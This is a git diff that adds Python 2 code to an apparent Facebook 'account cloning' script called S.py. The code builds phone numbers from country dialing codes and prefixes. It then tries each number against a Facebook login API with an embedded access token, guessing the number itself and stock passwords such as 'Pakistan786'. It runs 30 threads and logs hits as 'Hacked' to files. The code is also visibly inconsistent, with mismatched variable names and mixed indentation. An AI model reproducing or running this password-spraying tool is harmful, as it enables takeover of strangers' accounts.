eff8cfcf00049bccd224f885ed3d708abec720d2
BLACK-KILLER <63947251+ShuBhamg0sain@users.noreply.github.com>
2020-11-13 18:56:02 +0530

    Update S.py

--- S.py
+++ S.py
@@ -142,6 +142,510 @@ def menu():
         print '[0]\033[1;97m  Exit'
         print "\033[1;96m⊱⋕⊰══════════════════════════════════════════════⊱⋕⊰\n"
     action()
+def action():
+	FreakedDudex = raw_input('\n\033[1;91mChoose an Option>>> \033[1;95m')
+	if SG =='':
+		print '[!] Fill in correctly'
+		action()
+	elif SG =="1":
+                print (logo53)
+		os.system("clear")
+		print (logo27)
+		print("\033[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			SG()
+	elif SG =="2":
+                print (logo53)
+		os.system("clear")
+		print (logo28)
+		print("\033[1;93m555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+1"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			SG()
+	elif SG =="3":
+                print (logo53)
+		os.system("clear")
+		print (logo29)
+		print("\033[1;93m715,785,765,725,745,735,737, 706, 748, 783, 739, 759, 790")
+		try:
+			c = raw_input(" \033[1;95mchoose code  : ")
+			k="+44"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			SG()
+	elif SG =="4":
+                print (logo53)
+		os.system("clear")
+		print (logo30)
+		print("\033[1;93m905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
+		try:
+			c = raw_input(" \033[1;95mchoose code  : ")
+			k="+91"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			SG()
+	elif SG =="5":
+                print (logo53)
+		os.system("clear")
+		print (logo31)
+		print("\033[1;93m127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+55"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			SG()
+	elif SG =="6":
+                print (logo53)
+		os.system("clear")
+		print (logo32)
+		print("\033[1;93m11, 12, 19, 16, 15, 13, 14, 18, 17")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+81"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			SG()
+	elif SG =="7":
+                print (logo53)
+		os.system("clear")
+		print (logo33)
+		print("\033[1;93m1, 2, 3, 4, 5, 6, 7, 8, 9")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+82"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			SG()
+	elif SG =="8":
+                print (logo53)
+		os.system("clear")
+		print (logo34)
+		print("\033[1;93m311,323,385,388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+39"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+		        SG()
+	elif SG =="9":
+                print (logo53)
+		os.system("clear")
+		print (logo35)
+		print("\033[1;93m655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+34"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			SG()
+	elif SG =="10":
+                print (logo53)
+		os.system("clear")
+		print (logo36)
+		print("\033[1;93m66, 69, 78, 79, 60, 72, 67, 53, 51")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+48"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			SG()
+        elif SG =="11":
+                print (logo53)
+		os.system("clear")
+		print (logo37)
+		print("\033[1;93m01, ~to~~, 49")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="03"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+        elif FreakedDudex =="12":
+                print (logo53)
+		os.system("clear")
+		print (logo38)
+		print("\033[1;93m81,83,85,84,89,")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+        elif FreakedDudex =="13":
+                print (logo53)
+		os.system("clear")
+		print (logo39)
+		print("\033[1;93m(leave the first four digits and the last seven digits of any phone number in this country.Write the remaining digits here.69,693,698,694,695")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+3069"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakexDudex()
+        elif FreakedDudex =="14":
+                print (logo53)
+		os.system("clear")
+		print (logo40)
+		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.455")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+61"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+	elif FreakedDudex =="15":
+                print (logo53)
+		os.system("clear")
+		print (logo41)
+		print("\033[1;93m(leave the first one digits and the last seven digits of any phone number in this country.Write the remaining digits here.555,")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+1"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+	elif FreakedDudex =="16":
+                print (logo53)
+		os.system("clear")
+		print (logo42)
+		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.1355,1555,1855,")
+		try:
+			c = raw_input(" \033[1;95mchoose code  : ")
+			k="+86"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakexDudex()
+	elif FreakexDudex =="17":
+                print (logo53)
+		os.system("clear")
+		print (logo43)
+		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.2,3,4,5,6,7,8")
+		try:
+			c = raw_input(" \033[1;95mchoose code  : ")
+			k="+45"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakexDudex()
+	elif FreakedDudex =="18":
+                print (logo53)
+		os.system("clear")
+		print (logo44)
+		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.65,70,73,74,76,77")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+33"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+	elif FreakedDudex =="19":
+                print (logo53)
+		os.system("clear")
+		print (logo45)
+		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.151,152,153,155,157,159,160,162,179,163,174,163")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+49"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakexDudex()
+	elif FreakedDudex =="20":
+                print (logo53)
+		os.system("clear")
+		print (logo46)
+		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.11,12,13,14,15,16,17,18,19")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+60"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+	elif FreakedDudex =="21":
+                print (logo53)
+		os.system("clear")
+		print (logo47)
+		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.71,72,73,74,75,76,77,78")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+94"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+	elif FreakedDudex =="22":
+                print (logo53)
+		os.system("clear")
+		print (logo48)
+		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.55,54,53,52,50")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+90"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+	elif FreakedDudex =="23":
+                print (logo53)
+		os.system("clear")
+		print (logo49)
+		print("\033[1;93m(leave the first tree digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,55,58,54,56")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+971"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+        elif FreakedDudex =="24":
+                print (logo53)
+		os.system("clear")
+		print (logo50)
+		print("\033[1;93m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,51,52,53,54,55,56,57,58,")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+966"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+        elif FreakedDudex =="25":
+                print (logo53)
+		os.system("clear")
+		print (logo51)
+		print("\033[1;93m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here. 52,55")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+972"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+        elif FreakedDudex =="26":
+                print (logo53)
+		os.system("clear")
+		print (logo52)
+		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.990,915,901,933,938,902")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+98"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			FreakedDudex()
+	elif FreakedDudex =='0':
+		login()
+	else:
+		print '[!] Fill in correctly'
+		action()
+
+	xxx = str(len(id))
+	jalan ('[✓] Total Numbers: '+xxx)
+	time.sleep(0.05)
+	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+	time.sleep(0.05)
+	jalan ('[!] To Stop Process Press CTRL Then Press z')
+	time.sleep(0.05)
+	print 44*'-'
+	print (logo13)
+	
+			
+	def main(arg):
+		global cpb,oks
+		user = arg
+		try:
+			os.mkdir('save')
+		except OSError:
+			pass
+		try:
+			pass1 = user
+			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;92m{Hacked 100%💉}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
+				okb = open('save/successfull.txt', 'a')
+				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
+				okb.close()
+				oks.append(c+user+pass1)
+			else:
+				if 'www.facebook.com' in q['error_msg']:
+					print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass1+'\n'
+					cps = open('save/checkpoint.txt', 'a')
+					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
+					cps.close()
+					cpb.append(c+user+pass1)
+ 				else:
+ 				    pass2="786786"
+ 				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				    q = json.load(data)
+ 				    if 'access_token' in q:
+ 				        print '\x1b[1;92m{Hacked 100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
+ 				        okb = open('save/successfull.txt', 'a')
+ 				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
+ 				        okb.close()
+ 				        oks.append(c+user+pass2)
+ 				    else:
+ 				        if 'www.facebook.com' in q['error_msg']:
+ 					        print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass2+'\n'
+ 					        cps = open('save/checkpoint.txt', 'a')
+ 					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
+ 					        cps.close()
+ 					        cpb.append(c+user+pass2)
+                                        else:
+ 				            pass3="Pakistan"
+ 				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				            q = json.load(data)
+ 				            if 'access_token' in q:
+ 				                print '\x1b[1;92m{Hacked 100%💉}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
+ 				                okb = open('save/successfull.txt', 'a')
+ 				                okb.write(k+c+user+'-•◈•-'+pass3+'\n')
+ 				                okb.close()
+ 				                oks.append(c+user+pass3)
+ 				            else:
+ 				                if 'www.facebook.com' in q['error_msg']:
+ 					                print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass3+'\n'
+ 					                cps = open('save/checkpoint.txt', 'a')
+ 					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
+ 					                cps.close()
+ 					                cpb.append(c+user+pass3)
+                                                else:
+ 				                    pass4="Pakistan786"
+ 				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+ 				                    q = json.load(data)
+ 				                    if 'access_token' in q:
+ 				                        print '\x1b[1;92m{Hacked 100%💉}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
+ 				                        okb = open('save/successfull.txt', 'a')
+ 				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
+ 				                        okb.close()
+ 				                        oks.append(c+user+pass4)
+ 				                    else:
+ 				                        if 'www.facebook.com' in q['error_msg']:
+ 					                        print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass4+'\n'
+ 					                        cps = open('save/checkpoint.txt', 'a')
+ 					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
+ 					                        cps.close()
+ 					                        cpb.append(c+user+pass4)
+                except:
+                        pass
+
+        p = ThreadPool(30)
+        p.map(main, id)
+        print 50*'-'
+        print '[✓] Process Has Been Completed ....'
+        print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+        print('[✓] CP File Has Been Saved : save/checkpoint.txt')
+        raw_input('\n[Press Enter To Go Back]')
+        os.system('python2 S.py')
+
+if __name__ == '__main__':
+        menu()																													
+
+
+
 
 def action():
     global cpb
